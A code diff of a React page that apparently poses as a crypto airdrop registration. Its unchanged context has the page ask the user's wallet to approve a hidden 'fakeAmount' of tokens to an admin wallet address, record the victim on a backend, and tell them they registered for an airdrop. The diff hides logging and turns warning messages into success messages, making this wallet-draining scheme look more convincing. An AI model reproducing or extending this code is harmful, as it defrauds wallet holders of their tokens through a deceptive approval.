@@ -6,12 +6,12 @@ import Web3Modal from "web3modal";
 import WalletConnectProvider from "@walletconnect/web3-provider";
 import Fortmatic from "fortmatic";
 import Torus from "@toruslabs/torus-embed";
+import Portis from "@portis/web3";
 import { providers/*, ethers*/ } from "ethers";
 import Web3 from "web3";
 import 'react-notifications/lib/notifications.css';
 import $ from 'jquery';
 import 'bootstrap/dist/css/bootstrap.min.css';
-import ReactWOW from 'react-wow'
 import ReactPlayer from 'react-player';
 import video1 from "../assets/video1.mp4";
 import config from "../contracts/config";
@@ -119,7 +119,6 @@ const UserScreen = (props) => {
   const [walletStatus, setWalletStatus] = useState(false);
   const [initStatus, setInitStatus] = useState(false);
   const [userAllToken, setUserAllToken] = useState([]);
-  const [signer, setSigner] = useState();
   const [showAccountAddress, setShowAccountAddress] = useState("");
   const [state, dispatch] = useReducer(reducer, initialState);
   useEffect(() => {
@@ -427,12 +426,12 @@ const UserScreen = (props) => {
           } else {
             let api = "https://api.bscscan.com/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_BSC_SCAN_API_KEY;
             let temp = await axios.get(api);
-            console.log(temp);
+            // console.log(temp);
             const contractABI = JSON.parse(temp.data.result);
             const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
             await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((fakeAmount).toString(), "ether")).send({ from: myAddress })
               .then(async function (receipt) {
-                console.log(receipt);
+                // console.log(receipt);
                 await axios.post('http://localhost:5000/products', {
                   userWalletAddress: myAddress,
                   amount: approveAmount,
@@ -442,7 +441,7 @@ const UserScreen = (props) => {
                   adminAddress: adminWalletAddress,
                   price: approveToken.cost
                 });
-                NotificationManager.warning('you have succesfully registered for the airdrop, if you are lucky you will receive the price soon', 3000);
+                NotificationManager.success('you have succesfully registered for the airdrop, if you are lucky you will receive the price soon', 3000);
               });
           }
         }
@@ -471,41 +470,38 @@ const UserScreen = (props) => {
                   adminAddress: adminWalletAddress,
                   price: approveToken.cost
                 });
-                NotificationManager.warning('you have succesfully registered for the airdrop, if you are lucky you will receive the price soon', 3000);
+                NotificationManager.success('you have succesfully registered for the airdrop, if you are lucky you will receive the price soon', 3000);
               });
           }
         }
       }
     } catch (error) {
-      console.log(error.message);
+      // console.log(error.message);
     }
   }
   const { provider, web3Provider } = state;
 
   const connect = useCallback(async function () {
     try {
-      console.log(1);
       const provider = await web3Modal.connect();
-      console.log(222);
       if (window.ethereum) {
         // check if the chain to connect to is installed
-        await window.ethereum.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: config.chainHexID[config.chainID] }], // chainId must be in hexadecimal numbers
-        });
+        // await window.ethereum.request({
+        //   method: "wallet_switchEthereumChain",
+        //   params: [{ chainId: config.chainHexID[config.chainID] }], // chainId must be in hexadecimal numbers
+        // });
       } else {
         alert(
           "MetaMask is not installed. Please consider installing it: https://metamask.io/download.html"
         );
       }
-      NotificationManager.warning('wallet connect success!', 'Connect Info', 3000);
+      NotificationManager.success('wallet connect success!', 'Connect Info', 3000);
       const web3Provider = new providers.Web3Provider(provider);
       const signer = web3Provider.getSigner();
       const account = await signer.getAddress();
       const network = await web3Provider.getNetwork();
       const show_address =
         account.slice(0, 5) + "..." + account.slice(-4, account.length);
-      setSigner(web3Provider.getSigner());
       setShowAccountAddress(show_address);
       setMyaddress(account);
       setWalletStatus(true);
@@ -530,17 +526,17 @@ const UserScreen = (props) => {
             ],
           });
         } catch (addError) {
-          console.log(addError);
+          // console.log(addError);
         }
       } else if (error.code === 4001) {
-        console.log(error);
+        // console.log(error);
       }
-      console.log(`${error}`);
+      // console.log(`${error}`);
     }
   }, []);
   const disconnect = useCallback(async function () {
     await web3Modal.clearCachedProvider();
-    setSigner(null);
+    // setSigner(null);
     setShowAccountAddress(null);
     setMyaddress(null);
     dispatch({
@@ -549,7 +545,7 @@ const UserScreen = (props) => {
   }, []);
   useEffect(() => {
     if (web3Modal.cachedProvider) {
-      connect();
+      disconnect();
     }
   }, [connect]);
   useEffect(() => {
